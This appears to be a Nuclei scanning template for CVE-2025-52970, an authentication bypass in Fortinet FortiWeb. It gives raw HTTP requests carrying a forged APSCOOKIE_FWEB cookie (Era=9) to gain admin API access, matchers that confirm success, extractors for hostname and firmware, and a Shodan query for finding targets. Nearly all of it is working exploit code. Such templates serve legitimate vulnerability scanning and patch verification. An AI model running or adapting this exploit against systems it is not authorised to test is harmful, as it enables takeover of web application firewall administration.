id: CVE-2025-52970

info:
  name: Fortinet FortiWeb - Authentication Bypass (CVE-2025-52970)
  author: Jay Prakash
  severity: critical
  description: |
    Fortinet FortiWeb contains an authentication bypass vulnerability (CVE-2025-52970) due to
    improper cryptographic key selection when handling the APSCOOKIE_FWEB cookie. By supplying
    an out-of-range Era parameter value (e.g., 9), an attacker can force the backend to utilize
    a zero-value key for cryptographic operations, enabling full administrative access.
  reference:
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://nvd.nist.gov/vuln/detail/CVE-2025-52970
  metadata:
    verified: true
    shodan-query: 'ssl:"cn=fortiweb"'
    product: Fortinet FortiWeb
    kev: true
  tags: cve, cve2025, fortiweb, auth-bypass, kev

http:
  - raw:
      - |
        GET /mgmt/ HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Connection: close
        Cookie: APSCOOKIE_FWEB_{{aps_magic}}=Era=9&Payload={{payload}}&AuthHash={{authhash}}
        Upgrade-Insecure-Requests: 1

      - |
        GET /api/v2.0/system/status.systemstatus HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
        Connection: close
        Cookie: APSCOOKIE_FWEB_{{aps_magic}}=Era=9&Payload={{payload}}&AuthHash={{authhash}}

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        name: "PoC Response Validation"
        dsl:
          - 'status_code == 200 && contains(header, "application/json")'
          - 'contains(body, "administrativeDomain")'
          - 'contains(body, "operationMode")'
          - 'contains(body, "firmwareVersion")'
          - 'contains(body, "hostName")'

    extractors:
      - type: regex
        name: hostname
        part: body
        group: 1
        regex:
          - '"hostName":\s*"([^"]+)"'
      - type: regex
        name: firmware
        part: body
        group: 1
        regex:
          - '"firmwareVersion":\s*"([^"]+)"'
